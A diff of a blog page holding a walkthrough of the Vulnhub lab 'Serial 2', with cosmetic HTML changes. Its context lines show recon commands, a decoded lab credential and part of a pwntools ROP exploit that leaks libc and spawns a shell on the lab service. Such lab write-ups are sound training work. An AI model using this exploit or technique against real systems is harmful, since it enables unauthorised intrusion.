@@ -5,7 +5,7 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="map[name:hexterisk]">
-<meta name="description" content="Name: serial: 2 Date release: 27 Sep 2019 Author: sk4 Series: serial  Initial Discovery VMIP is the VM’s IP Address
+<meta name="description" content="Name: serial: 2 Date release: 27 Sep 2019 Author: sk4 Series: serial   Initial Discovery VMIP is the VM’s IP Address
 LHIP is the Local Host’s IP Address
 Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.
 IP Discovery Run sudo netdiscover.
@@ -46,20 +46,20 @@ Output of netdiscover.
     <meta name="theme-color" content="#252627">
 
 <meta itemprop="name" content="Serial 2">
-<meta itemprop="description" content="Name: serial: 2 Date release: 27 Sep 2019 Author: sk4 Series: serial  Initial Discovery VMIP is the VM’s IP Address
+<meta itemprop="description" content="Name: serial: 2 Date release: 27 Sep 2019 Author: sk4 Series: serial   Initial Discovery VMIP is the VM’s IP Address
 LHIP is the Local Host’s IP Address
 Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.
 IP Discovery Run sudo netdiscover.
 It detects online hosts by sending ARP requests.
 Output of netdiscover.
-192.168.1.10 happens to be the IP of the VM."><meta itemprop="datePublished" content="2020-05-09T00:00:00&#43;00:00" />
-<meta itemprop="dateModified" content="2020-05-09T00:00:00&#43;00:00" />
+192.168.1.10 happens to be the IP of the VM."><meta itemprop="datePublished" content="2020-05-09T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2020-05-09T00:00:00+00:00" />
 <meta itemprop="wordCount" content="1945"><meta itemprop="image" content="https://hexterisk.github.io/blog"/>
 <meta itemprop="keywords" content="Serial2,Vulnhub,pentesting,penetration,testing,binary," /><meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://hexterisk.github.io/blog"/>
 
 <meta name="twitter:title" content="Serial 2"/>
-<meta name="twitter:description" content="Name: serial: 2 Date release: 27 Sep 2019 Author: sk4 Series: serial  Initial Discovery VMIP is the VM’s IP Address
+<meta name="twitter:description" content="Name: serial: 2 Date release: 27 Sep 2019 Author: sk4 Series: serial   Initial Discovery VMIP is the VM’s IP Address
 LHIP is the Local Host’s IP Address
 Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.
 IP Discovery Run sudo netdiscover.
@@ -156,6 +156,7 @@ Output of netdiscover.
 <li><strong>Author</strong>: <a href="https://www.vulnhub.com/author/sk4,633/">sk4</a></li>
 <li><strong>Series</strong>: <a href="https://www.vulnhub.com/series/serial,231/">serial</a></li>
 </ul>
+<p> </p>
 <h2 id="initial-discovery">Initial Discovery</h2>
 <p><code>VMIP</code> is the VM’s IP Address</p>
 <p><code>LHIP</code> is the Local Host’s IP Address</p>
@@ -192,6 +193,7 @@ Here, we are using <a href="https://github.com/danielmiessler/SecLists/blob/mast
 <p>Further, several endpoints have been listed on the website. The <code>/api</code> discovered earlier has further endpoints.</p>
 <p><img src="https://hexterisk.github.io/blog/Serial_2/P2M-9D6rDzVmsPHrfwxbCWpB3mbKqjqIEwPhxN3yZmSZO0bqDY-ShZ9vuTySTyIsr3m149xKFyOI0LgfGGV0lA9rLtt_c_IzLTm2EKmZwQLHicayW2QCYVzRWdcGeHz9Sxd-uzhORs-xn_afrQ.dat" alt="&ldquo;api&rdquo;">
 <em>Listed endpoints.</em></p>
+<p> </p>
 <h2 id="hunting-begins">Hunting begins</h2>
 <p>Let&rsquo;s checkout the weird service running on port 10000 first.</p>
 <p>Run <code>telnet 192.168.1.10 10000</code></p>
@@ -210,7 +212,7 @@ Here, we are using <a href="https://github.com/danielmiessler/SecLists/blob/mast
 <p><img src="https://hexterisk.github.io/blog/Serial_2/iB8ei9LOtdAVHXVOZ02R44hDg3H8-uDdN-tEUrtXKWXMd7bDADV6kti3eBVCN7BwVqbwxFakXwLUTPBtlQfiUzu95F5W8u8HQbYoFiNuDFfX3TY6X-wcTaBXm69pBpIlCUh3ASrtYRhdKX1zZw.png" alt="&ldquo;jadx&rdquo;">
 <em>strings.xml file of the apk.</em></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
-<span style="color:#66d9ef">print</span>(base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;c2s0OmJKNiErbSUqJF0jeDc9TEE=&#34;</span>))
+print(base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;c2s0OmJKNiErbSUqJF0jeDc9TEE=&#34;</span>))
 </code></pre></div><p><code>sk4:bJ6!+m%*$]#x7=LA</code></p>
 <p>We open postman to make a request to the endpoints we found on the website earlier, and try to use this decoded value as auth credentials.</p>
 <p>We choose the authentication type as Basic Auth and enter:</p>
@@ -321,6 +323,7 @@ Here, we are using <a href="https://github.com/danielmiessler/SecLists/blob/mast
 <p>The password is validated and we get the root shell. However, it does not allow us to read the <code>flag.txt</code> file. The shell is clearly a restricted one.</p>
 <p>Similar thing happens when I try this tactic via the service on port 10000 from local host. Clearly there&rsquo;s more to the binary than we initially thought.</p>
 <p>We are now getting into the arena of binary exploitation. You could just skip ahead to the end and use the given script to pwn the service if you do not want to get into this section.</p>
+<p> </p>
 <h2 id="binary-exploitation">Binary Exploitation</h2>
 <p>We open the binary in IDA.</p>
 <p>The binary is short and sweet, and there&rsquo;s not much to it.</p>
@@ -379,7 +382,7 @@ Here, we are using <a href="https://github.com/danielmiessler/SecLists/blob/mast
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>, checksec <span style="color:#f92672">=</span> False)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>, checksec <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>)
 
 offset_binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
 offset_puts <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
@@ -410,27 +413,27 @@ loop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4009c9</
     chain <span style="color:#f92672">+=</span> p64(plt_puts)
     chain <span style="color:#f92672">+=</span> p64(loop)
     r<span style="color:#f92672">.</span>sendline(chain)
-    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    print(r<span style="color:#f92672">.</span>recvline())
 
     <span style="color:#75715e"># Giving the exit command would cause this function to return, thus transferring</span>
     <span style="color:#75715e"># control our ROP chain.</span>
     r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;exit&#34;</span>)
 
-    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
-    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
-    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
-    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
-    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    print(r<span style="color:#f92672">.</span>recvline())
+    print(r<span style="color:#f92672">.</span>recvline())
+    print(r<span style="color:#f92672">.</span>recvline())
+    print(r<span style="color:#f92672">.</span>recvline())
+    print(r<span style="color:#f92672">.</span>recvline())
 
     <span style="color:#75715e"># The last line received contains the leaked address.</span>
     <span style="color:#75715e"># We take out the first 8 bytes, i.e. the base address.</span>
-    leak <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline(False)[:<span style="color:#ae81ff">8</span>]
+    leak <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline(<span style="color:#66d9ef">False</span>)[:<span style="color:#ae81ff">8</span>]
     leak <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">8</span><span style="color:#f92672">-</span>len(leak))
     puts <span style="color:#f92672">=</span> u64(leak)
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Leaked &#39;puts&#39; address: &#34;</span>, hex(puts))
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&#39;puts&#39; offset: &#34;</span>, hex(offset_puts))
+    print(<span style="color:#e6db74">&#34;Leaked &#39;puts&#39; address: &#34;</span>, hex(puts))
+    print(<span style="color:#e6db74">&#34;&#39;puts&#39; offset: &#34;</span>, hex(offset_puts))
     libc_base <span style="color:#f92672">=</span> puts <span style="color:#f92672">-</span> offset_puts
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;libc base address: &#34;</span>, hex(libc_base))
+    print(<span style="color:#e6db74">&#34;libc base address: &#34;</span>, hex(libc_base))
 
     <span style="color:#75715e"># We create a new ROP chain to get the shell.</span>
     chain <span style="color:#f92672">=</span> junk
@@ -442,9 +445,9 @@ loop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4009c9</
     chain <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> offset_system)
     r<span style="color:#f92672">.</span>sendline(chain)
 
-    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    print(r<span style="color:#f92672">.</span>recvline())
     r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;exit&#34;</span>)
-    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    print(r<span style="color:#f92672">.</span>recvline())
     r<span style="color:#f92672">.</span>interactive()
 
 <span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
